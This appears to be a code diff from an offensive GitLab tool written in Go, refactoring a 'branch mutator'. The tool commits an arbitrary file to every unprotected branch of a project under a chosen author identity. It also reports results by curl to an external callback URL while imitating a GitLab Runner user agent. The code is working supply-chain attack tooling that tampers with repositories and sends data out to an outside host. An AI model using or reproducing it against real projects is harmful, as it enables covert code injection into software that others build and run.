@@ -100,7 +100,7 @@ func buildBranchMutatorScript(o BranchMutatorOptions) string {
 
 	var b strings.Builder
 
-	b.WriteString(fmt.Sprintf(`
+	fmt.Fprintf(&b, `
 _BRANCH_MUTATE() {
   _targeted=0
   _mutated=0
@@ -114,7 +114,7 @@ _BRANCH_MUTATE() {
   echo "[*] Target file: $_file_path"
   echo "[*] Max branches: $_max"
 
-`, maxBranches, filePath, commitMsg, fileContent))
+`, maxBranches, filePath, commitMsg, fileContent)
 
 	// Step 1: List all branches via REST API
 	b.WriteString(`  # Step 1: List all branches via GitLab REST API
@@ -190,14 +190,14 @@ print(json.dumps({
 `)
 
 	if callbackURL != "" {
-		b.WriteString(fmt.Sprintf(`
+		fmt.Fprintf(&b, `
   # Step 3: Report results to callback
   curl -sS -X POST \
     -H "Content-Type: application/json" \
     -H "User-Agent: GitLab-Runner/16.0" \
     -d "{\"targeted\":$_targeted,\"mutated\":$_mutated,\"errors\":$_errors,\"project\":\"$CI_PROJECT_PATH\"}" \
     "%s" >/dev/null 2>&1 || true
-`, callbackURL))
+`, callbackURL)
 	}
 
 	b.WriteString(`
@@ -269,7 +269,6 @@ func RunBranchMutator(ctx context.Context, client *gitlab.Client, projectID any,
 		page = resp.NextPage
 	}
 
-	// Iterate branches, skip protected, commit file
 	for _, branch := range branches {
 		if res.Targeted >= maxBranches {
 			break
@@ -287,33 +286,7 @@ func RunBranchMutator(ctx context.Context, client *gitlab.Client, projectID any,
 			fmt.Fprintf(out, "[*] Mutating branch: %s\n", branch.Name)
 		}
 
-		// Determine action: create or update
-		action := gitlab.FileCreate
-		_, _, ferr := client.RepositoryFiles.GetFile(
-			projectID, filePath,
-			&gitlab.GetFileOptions{Ref: new(branch.Name)},
-			gitlab.WithContext(ctx),
-		)
-		if ferr == nil {
-			action = gitlab.FileUpdate
-		}
-
-		commitOpts := &gitlab.CreateCommitOptions{
-			Branch:        new(branch.Name),
-			CommitMessage: new(commitMsg),
-			AuthorName:    new(authorName),
-			AuthorEmail:   new(authorEmail),
-			Actions: []*gitlab.CommitActionOptions{
-				{
-					Action:   new(action),
-					FilePath: new(filePath),
-					Content:  new(fileContent),
-				},
-			},
-		}
-
-		_, _, err := client.Commits.CreateCommit(projectID, commitOpts, gitlab.WithContext(ctx))
-		if err != nil {
+		if err := commitToBranch(ctx, client, projectID, branch.Name, filePath, fileContent, commitMsg, authorName, authorEmail); err != nil {
 			res.Errors++
 			if out != nil {
 				fmt.Fprintf(out, "[-] Failed to commit to branch %s: %v\n", branch.Name, err)
@@ -329,4 +302,33 @@ func RunBranchMutator(ctx context.Context, client *gitlab.Client, projectID any,
 	}
 
 	return res
+}
+
+func commitToBranch(ctx context.Context, client *gitlab.Client, projectID any, branchName, filePath, content, msg, authorName, authorEmail string) error {
+	action := gitlab.FileCreate
+	_, _, ferr := client.RepositoryFiles.GetFile(
+		projectID, filePath,
+		&gitlab.GetFileOptions{Ref: new(branchName)},
+		gitlab.WithContext(ctx),
+	)
+	if ferr == nil {
+		action = gitlab.FileUpdate
+	}
+
+	commitOpts := &gitlab.CreateCommitOptions{
+		Branch:        new(branchName),
+		CommitMessage: new(msg),
+		AuthorName:    new(authorName),
+		AuthorEmail:   new(authorEmail),
+		Actions: []*gitlab.CommitActionOptions{
+			{
+				Action:   new(action),
+				FilePath: new(filePath),
+				Content:  new(content),
+			},
+		},
+	}
+
+	_, _, err := client.Commits.CreateCommit(projectID, commitOpts, gitlab.WithContext(ctx))
+	return err
 }
